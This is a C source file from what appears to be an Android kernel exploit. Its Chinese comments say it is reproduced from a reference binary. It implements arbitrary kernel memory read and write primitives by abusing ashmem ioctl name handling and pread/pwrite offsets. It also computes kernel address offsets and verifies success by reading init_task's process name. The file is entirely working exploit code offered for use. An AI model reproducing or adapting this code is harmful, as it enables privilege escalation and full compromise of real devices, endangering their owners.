/* rw.c — 内核任意读写：ashmem ioctl 原语
 *
 * 照参考 kernel_read_data 0x6258f0 / kernel_write_data 0x625b70 逐指令重写：
 *   raw 结构（0x80 / 0x70 字节）→ max(byte,1) 铺进 0x100 字节的 ioctl 结构（先填 0x41）
 *   → ioctl(fd, 0x41007701, st) → 逐字节缩短名字（第 n 字节置 0）后重发 ioctl
 *   → 读用 pread(fd, buf, len, magic-len)；写用 pwrite(fd, buf, len, 0)
 * 设备用「偏移 + 结构里存的 delta」合成真实内核地址，故 raw 的布局必须与参考一字不差：
 *   读：delta = addr - (magic - len)  放在 raw+5（8 字节），magic = "dev/ashm"
 *   写：addr 放在 raw+0x4d（8 字节）、len 放在 raw+0x55（4 字节）
 */
#define _GNU_SOURCE
#include "ghost.h"

#include <errno.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define GHOST_ASHMEM_MAGIC 0x6d6873612f766564ULL /* "dev/ashm" */
#define GHOST_ASHMEM_IOCTL 0x41007701

void reset_pipe_attempt(void) { DBG("reset_pipe_attempt"); }
void sysctl_destroy(void) { DBG("sysctl_destroy"); }
int sysctl_read(const char *path, uint64_t *out)
{
    (void)path;
    if (out) *out = 0;
    return -1;
}

/* 参考里的裁剪循环：先整串（0x80）发一次，然后 n=0x7f..1 逐级缩短再发 */
static int ashmem_name_ioctl(int fd, const uint8_t *raw, size_t rawlen)
{
    uint8_t st[0x100];
    size_t i, n;

    memset(st, 0x41, sizeof(st));
    for (i = 0; i < 0x80 && i < rawlen; i++) st[i] = raw[i] ? raw[i] : 1;
    st[0x80] = 0;
    if (ioctl(fd, GHOST_ASHMEM_IOCTL, st) != 0) return -1;

    for (n = 0x7f; n >= 1; n--) {
        memset(st, 0x41, sizeof(st));
        for (i = 0; i < n && i < rawlen; i++) st[i] = raw[i] ? raw[i] : 1;
        st[n] = 0;
        if (ioctl(fd, GHOST_ASHMEM_IOCTL, st) != 0) return -1;
    }
    return 0;
}

int kernel_read_data(int fd, uint64_t addr, void *buf, size_t len)
{
    uint8_t raw[0x80];
    uint64_t off, delta;
    ssize_t n;

    if (fd < 0 || !buf || !len) return -1;
    off = GHOST_ASHMEM_MAGIC - len;
    delta = addr - off;
    memset(raw, 0, sizeof(raw));
    memcpy(raw + 5, &delta, 8);
    if (ashmem_name_ioctl(fd, raw, sizeof(raw)) != 0) return -1;
    n = pread(fd, buf, len, (off_t)off);
    return (n == (ssize_t)len) ? 0 : -1;
}

int kernel_write_data(int fd, uint64_t addr, const void *buf, size_t len)
{
    uint8_t raw[0x70];
    uint32_t l32;
    ssize_t n;

    if (fd < 0 || !buf || !len) return -1;
    l32 = (uint32_t)len;
    memset(raw, 0, sizeof(raw));
    memcpy(raw + 0x4d, &addr, 8);
    memcpy(raw + 0x55, &l32, 4);
    if (ashmem_name_ioctl(fd, raw, sizeof(raw)) != 0) return -1;
    n = pwrite(fd, buf, len, 0);
    return (n == (ssize_t)len) ? 0 : -1;
}

int kernel_read64(int fd, uint64_t addr, uint64_t *out)
{
    uint64_t v = 0;
    if (!out) return -1;
    if (kernel_read_data(fd, addr, &v, 8) != 0) return -1;
    *out = v;
    return 0;
}

/* data_addr 0x625dec：从内核里读 page_offset_base
 *   a = *(u64*)(slide + DATA_PROBE + 0xa8)
 *   b = *(u64*)(slide + DATA_PROBE)
 *   data_off = slide - b - a + 0xffffff8000000000
 */
int ghost_boot_page_off(void)
{
    uint64_t a = 0, b = 0, d;
    uint64_t probe = g_map->race[4];

    if (g.page_off) return 0;
    if (!probe) {
        LOG("[!] data anchor unknown for this build");
        return -1;
    }
    if (kernel_read64(g.h, probe + g.slide + 0xa8, &a) != 0 ||
        kernel_read64(g.h, probe + g.slide, &b) != 0) {
        LOG("[!] data_offset read failed");
        return -1;
    }
    if (!a) {
        LOG("[!] data_offset probe returned 0");
        return -1;
    }
    d = g.slide - b - a + 0xffffff8000000000ULL;
    if (!is_kptr(d)) {
        LOG("[!] data_offset not a kernel address: %#llx", (unsigned long long)d);
        return -1;
    }
    g.page_off = d;
    LOG("[+] data_offset=%#llx", (unsigned long long)d);
    return 0;
}

/* race 之后 ashmem 原语本身就是任意内核读写；用 init_task->comm 自校验 */
int install_pipe_physrw(int fd)
{
    char comm[17];
    memset(comm, 0, sizeof(comm));
    if (!g.init_task) {
        LOG("[!] init_task unknown for this build");
        return 0;
    }
    if (kernel_read_data(fd, g.init_task + g_map->task_comm, comm, 16) != 0) {
        LOG("[!] physrw selfcheck read failed");
        return 0;
    }
    if (memcmp(comm, "swapper/", 8) != 0) {
        LOG("[!] physrw selfcheck comm=%s", comm);
        return 0;
    }
    LOG("[+] physrw ok (ashmem primitive, comm=%s)", comm);
    return 1;
}
